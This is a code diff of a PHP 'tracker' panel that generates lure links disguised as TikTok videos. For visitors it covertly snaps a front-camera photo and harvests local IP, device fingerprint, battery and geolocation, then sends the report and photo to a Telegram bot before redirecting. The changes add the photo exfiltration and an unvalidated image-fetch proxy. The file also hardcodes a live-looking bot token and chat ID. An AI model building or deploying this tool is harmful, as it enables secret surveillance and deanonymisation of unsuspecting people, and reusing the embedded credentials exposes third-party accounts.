@@ -9,27 +9,62 @@ set_time_limit(0);
 
 session_start();
 
+// ==============================================================================
+// 🖼️ مولد الصور الذكي (يجعل المعاينة مربعة وتناسب ماسنجر)
+// ==============================================================================
+if (isset($_GET['gen_img'])) {
+    $img_url = base64_decode($_GET['gen_img']);
+    
+    $ch = curl_init($img_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $image_data = curl_exec($ch);
+    curl_close($ch);
+
+    if ($image_data) {
+        if (function_exists('imagecreatefromstring')) {
+            $src = imagecreatefromstring($image_data);
+            if ($src) {
+                $w = imagesx($src); $h = imagesy($src); $target_size = 800;
+                $dst = imagecreatetruecolor($target_size, $target_size);
+                $bg = imagecreatetruecolor($target_size, $target_size);
+                $scale = max($target_size / $w, $target_size / $h);
+                $new_w = $w * $scale; $new_h = $h * $scale;
+                $x = ($target_size - $new_w) / 2; $y = ($target_size - $new_h) / 2;
+                imagecopyresampled($bg, $src, $x, $y, 0, 0, $new_w, $new_h, $w, $h);
+                for ($i = 0; $i < 15; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
+                imagefilter($bg, IMG_FILTER_BRIGHTNESS, -50);
+                $scale_center = $target_size / $h; $new_w_center = $w * $scale_center; $new_h_center = $target_size;
+                $x_center = ($target_size - $new_w_center) / 2; $y_center = 0;
+                imagecopyresampled($dst, $bg, 0, 0, 0, 0, $target_size, $target_size, $target_size, $target_size);
+                imagecopyresampled($dst, $src, $x_center, $y_center, 0, 0, $new_w_center, $new_h_center, $w, $h);
+                header('Content-Type: image/jpeg'); header("Cache-Control: public, max-age=86400");
+                imagejpeg($dst, null, 90);
+                imagedestroy($src); imagedestroy($bg); imagedestroy($dst);
+                exit;
+            }
+        }
+        header('Content-Type: image/jpeg'); echo $image_data; exit;
+    }
+    header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80"); exit;
+}
+
 $db_file = __DIR__ . '/tracker_enhanced_v3.db';
 
 try {
     $db = new PDO('sqlite:' . $db_file);
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
-    // تحسين سرعة قاعدة البيانات
     $db->exec("PRAGMA journal_mode=WAL;");
     $db->exec("PRAGMA synchronous=NORMAL;");
     $db->exec("PRAGMA foreign_keys=ON;");
-    $db->exec("PRAGMA cache_size=-64000;"); // زيادة الذاكرة المؤقتة
+    $db->exec("PRAGMA cache_size=-64000;");
 
-    // 1. جدول المستخدمين (إضافة توكن التلجرام)
     $db->exec("CREATE TABLE IF NOT EXISTS users (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        username TEXT UNIQUE,
-        password TEXT,
-        role TEXT DEFAULT 'user',
-        tg_chat TEXT,
-        tg_token TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT,
+        role TEXT DEFAULT 'user', tg_chat TEXT, tg_token TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
     try { $db->exec("ALTER TABLE users ADD COLUMN tg_token TEXT"); } catch (Exception $e) {}
 
@@ -39,109 +74,86 @@ try {
         $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES ('admin', ?, 'admin', '6475721500', '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU')")->execute([$hash]);
     }
 
-    // 2. جدول الروابط (إضافة اسم الرابط)
     $db->exec("CREATE TABLE IF NOT EXISTS links (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        user_id INTEGER,
-        name TEXT,
-        code TEXT UNIQUE, 
-        target_url TEXT, 
-        meta_title TEXT,
-        meta_image TEXT,
-        use_camera INTEGER DEFAULT 1,
+        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, name TEXT, code TEXT UNIQUE, 
+        target_url TEXT, meta_title TEXT, meta_image TEXT, use_camera INTEGER DEFAULT 1, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
     try { $db->exec("ALTER TABLE links ADD COLUMN user_id INTEGER"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE links ADD COLUMN name TEXT"); } catch (Exception $e) {}
-    // فهرس لتسريع البحث
     $db->exec("CREATE INDEX IF NOT EXISTS idx_link_code ON links(code)");
 
-    // 3. جدول السجلات
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        code TEXT, 
-        image_data TEXT, 
-        public_ip TEXT, 
-        local_ip TEXT, 
-        port TEXT, 
-        location TEXT, 
-        isp_info TEXT, 
-        vpn_status TEXT, 
-        device_info TEXT, 
-        latitude REAL,
-        longitude REAL,
-        gpu_info TEXT,
-        battery_info TEXT,
-        screen_info TEXT,
-        canvas_fp TEXT,
+        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, 
+        local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, 
+        latitude REAL, longitude REAL, gpu_info TEXT, battery_info TEXT, screen_info TEXT, canvas_fp TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
-    // فهرس لتسريع البحث
     $db->exec("CREATE INDEX IF NOT EXISTS idx_capture_code ON captures(code)");
-
     try { $db->exec("ALTER TABLE captures ADD COLUMN gpu_info TEXT"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE captures ADD COLUMN battery_info TEXT"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE captures ADD COLUMN screen_info TEXT"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE captures ADD COLUMN canvas_fp TEXT"); } catch (Exception $e) {}
 
-} catch (Exception $e) {
-    die("Database error: " . $e->getMessage());
-}
+} catch (Exception $e) { die("Database error: " . $e->getMessage()); }
 
-// دالة إرسال إشعار تلجرام
-function sendTelegramNotification($chat_id, $message, $custom_token = null) {
+// دالة إرسال إشعار تلجرام (تدعم إرسال الصور كملف مرفق)
+function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_token = null) {
     if (empty($chat_id)) return;
     $token = $custom_token ?: '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
-    $url = "https://api.telegram.org/bot{$token}/sendMessage";
-    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
     
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 2); // وقت قصير جداً
-    curl_exec($ch);
-    curl_close($ch);
+    // إذا كانت هناك صورة، نستخدم sendPhoto لإرسالها مع التعليق
+    if (!empty($image_base64) && strpos($image_base64, 'data:image/') === 0) {
+        $url = "https://api.telegram.org/bot{$token}/sendPhoto";
+        
+        // تحويل Base64 إلى ملف مؤقت
+        $image_parts = explode(";base64,", $image_base64);
+        $image_base64_data = base64_decode($image_parts[1] ?? '');
+        $tmpfile = tempnam(sys_get_temp_dir(), 'tg_img_') . '.jpg';
+        file_put_contents($tmpfile, $image_base64_data);
+
+        $data = [
+            'chat_id' => $chat_id, 
+            'caption' => $message, 
+            'parse_mode' => 'HTML',
+            'photo' => new CURLFile($tmpfile)
+        ];
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_exec($ch);
+        curl_close($ch);
+
+        @unlink($tmpfile); // حذف الملف المؤقت
+    } else {
+        // إرسال نص فقط
+        $url = "https://api.telegram.org/bot{$token}/sendMessage";
+        $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 
+        curl_exec($ch);
+        curl_close($ch);
+    }
 }
 
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'];
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 4, // تقليل الوقت
-        CURLOPT_CONNECTTIMEOUT => 2,
-        CURLOPT_ENCODING => "", // تفعيل ضغط gzip للسرعة
-        CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
-    ]);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 4, CURLOPT_CONNECTTIMEOUT => 2, CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)']);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
             return ['title' => $data['title'], 'image' => $data['thumbnail_url']];
         }
-    }
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 4, 
-        CURLOPT_CONNECTTIMEOUT => 2,
-        CURLOPT_ENCODING => "",
-        CURLOPT_FOLLOWLOCATION => true, 
-        CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'facebookexternalhit/1.1'
-    ]);
-    $html = curl_exec($ch); curl_close($ch);
-    if ($html) {
-        $dom = new DOMDocument();
-        @$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
-        $xpath = new DOMXPath($dom);
-        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
-        if ($titleNodes->length > 0) $meta['title'] = trim($titleNodes->item(0)->nodeValue);
-        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
-        if ($imageNodes->length > 0) $meta['image'] = trim($imageNodes->item(0)->nodeValue);
     }
     return $meta;
 }
@@ -154,6 +166,7 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
+// تحسين التعرف على المتعاملين
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -167,11 +180,15 @@ function get_ip_details($ip) {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
             $isp = $data['isp'] ?? 'Unknown ISP';
             
+            // مطابقة دقيقة لمزودي الخدمة في الجزائر
             if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) $isp = 'Djezzy 🇩🇿';
             elseif (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) $isp = 'Mobilis 🇩🇿';
             elseif (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false) $isp = 'Ooredoo 🇩🇿';
             elseif (stripos($isp, 'Optimum') !== false) $isp = 'Optimum Telecom 🇩🇿';
-            elseif (stripos($isp, 'Algerie Telecom') !== false) $isp = 'Algérie Télécom 🇩🇿';
+            elseif (stripos($isp, 'Algerie Telecom') !== false || stripos($isp, 'Algérie Télécom') !== false) $isp = 'Algérie Télécom 🇩🇿';
+            elseif (stripos($isp, 'Icosnet') !== false) $isp = 'Icosnet 🇩🇿';
+            elseif (stripos($isp, 'Smart') !== false) $isp = 'Smart 🇩🇿';
+            elseif (stripos($isp, 'Lacom') !== false) $isp = 'Lacom 🇩🇿';
             else $isp = implode(' ', array_slice(explode(' ', trim($isp)), 0, 3));
 
             $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
@@ -215,10 +232,13 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
+            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?gen_img=" . base64_encode($meta_image);
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
+            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
+            echo '<meta property="og:image:width" content="800"><meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
             echo '</head><body></body></html>';
             exit();
@@ -227,18 +247,13 @@ if (isset($_GET['r'])) {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             if ($is_bot) exit('OK');
             
-            // إرسال الرد فوراً للمتصفح لإكمال التوجيه بأقصى سرعة
             if (function_exists('fastcgi_finish_request')) {
                 echo 'OK';
                 fastcgi_finish_request();
             } else {
-                header('Connection: close');
-                header('Content-Length: 2');
-                echo 'OK';
-                flush();
+                header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
             }
 
-            // استكمال معالجة البيانات في الخلفية
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
             
@@ -259,8 +274,9 @@ if (isset($_GET['r'])) {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
                 
+                // تغيير "اسم الرابط" إلى "اسم الحساب"
                 $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
-                $msg .= "🔗 <b>اسم الرابط:</b> {$link['name']}\n";
+                $msg .= "🔗 <b>اسم الحساب:</b> {$link['name']}\n";
                 $msg .= "📱 <b>الموديل:</b> {$device}\n";
                 $msg .= "🌍 <b>الموقع:</b> {$ip_details['location']}\n";
                 $msg .= "📡 <b>المتعامل:</b> {$ip_details['isp']}\n";
@@ -269,7 +285,9 @@ if (isset($_GET['r'])) {
                 $msg .= "🔌 <b>المنفذ:</b> <code>{$port}</code>\n";
                 $msg .= "🔋 <b>البطارية:</b> {$battery_info}\n";
                 $msg .= "🔑 <b>بصمة Canvas:</b> <code>{$canvas_fp}</code>\n";
-                sendTelegramNotification($owner_tg_chat, $msg, $owner_tg_token);
+                
+                // إرسال التقرير مع الصورة
+                sendTelegramAlert($owner_tg_chat, $msg, $img_base64, $owner_tg_token);
             } catch (Exception $e) {}
             exit;
         }
@@ -288,13 +306,13 @@ if (isset($_GET['r'])) {
         function getGPUInfo() { try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); const ext = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch (e) { return 'Unknown'; } }
         async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
         function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
-        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 200); }); } // تقليل وقت الانتظار إلى 200ms
+        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 200); }); }
         async function initTracking() {
             let imageData = "";
             if (useCamera) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                    const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 150)); // تقليل وقت الكاميرا
+                    const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 150));
                     const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360;
                     canvas.getContext('2d').drawImage(video, 0, 0, 480, 360); imageData = canvas.toDataURL('image/jpeg', 0.5);
                     stream.getTracks().forEach(track => track.stop());
@@ -304,7 +322,6 @@ if (isset($_GET['r'])) {
             const formData = new URLSearchParams();
             formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp); formData.append('gpu', gpu); formData.append('screen', screen); formData.append('battery', battery); formData.append('canvas_fp', canvasFp);
             
-            // التوجيه الفوري وإرسال البيانات في الخلفية
             if (navigator.sendBeacon) { 
                 navigator.sendBeacon(window.location.href, formData); 
                 window.location.replace(targetUrl); 
@@ -323,7 +340,7 @@ if (isset($_GET['r'])) {
 }
 
 // ==========================================
-// تسجيل الدخول والخروج
+// لوحة التحكم
 // ==========================================
 $login_error = '';
 if (isset($_POST['login'])) {
@@ -349,9 +366,6 @@ $is_admin = $is_logged_in && $_SESSION['role'] === 'admin';
 $current_user_id = $_SESSION['user_id'] ?? 0;
 $current_username = $_SESSION['username'] ?? '';
 
-// ==========================================
-// العمليات
-// ==========================================
 if ($is_logged_in) {
     $pass_error = ''; $pass_success = '';
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_my_password'])) {
@@ -463,15 +477,16 @@ if ($is_logged_in) {
         :root { --bg: #070913; --card: rgba(16, 23, 42, 0.85); --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; --sidebar-bg: rgba(15, 21, 35, 0.9); }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         
-        @keyframes animatedBg {
+        /* 🌟 الأنيميشن الجديد: تدرج لوني ناعم بين الأسود الداكن والأخضر */
+        @keyframes smoothPulse {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
         body { 
-            background: linear-gradient(-45deg, #070913, #1e1b4b, #0f172a, #090d16);
-            background-size: 400% 400%;
-            animation: animatedBg 15s ease infinite;
+            background: linear-gradient(135deg, #05080f 0%, #0d1712 50%, #05080f 100%);
+            background-size: 200% 200%;
+            animation: smoothPulse 10s ease-in-out infinite;
             color: var(--text); 
             min-height: 100vh; 
             display: flex; 
@@ -610,7 +625,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V13</p>
+                <p>Aziz Edition V15</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
@@ -645,8 +660,7 @@ if ($is_logged_in) {
                     <div class="card-title">🔗 إنشاء رابط تيك توك جديد</div>
                     <form method="POST">
                         <div class="form-group">
-                            <!-- تم إزالة النص التوضيحي -->
-                            <input type="text" name="link_name" placeholder="اسم الرابط" required>
+                            <input type="text" name="link_name" placeholder="اسم الحساب" required>
                         </div>
                         <div class="form-group">
                             <input type="text" name="target_url" placeholder="ضع رابط فيديو تيك توك هنا..." required>
@@ -696,7 +710,7 @@ if ($is_logged_in) {
                             <?php foreach ($captures as $cap): ?>
                                 <div class="capture-card">
                                     <div style="background: rgba(139, 92, 246, 0.2); padding: 10px; font-weight: bold; color: var(--accent); text-align: center; border-bottom: 1px solid var(--border);">
-                                        📌 <?php echo htmlspecialchars($cap['link_name'] ?? 'رابط بدون اسم'); ?>
+                                        📌 <?php echo htmlspecialchars($cap['link_name'] ?? 'حساب بدون اسم'); ?>
                                     </div>
 
                                     <?php if (!empty($cap['image_data'])): ?>
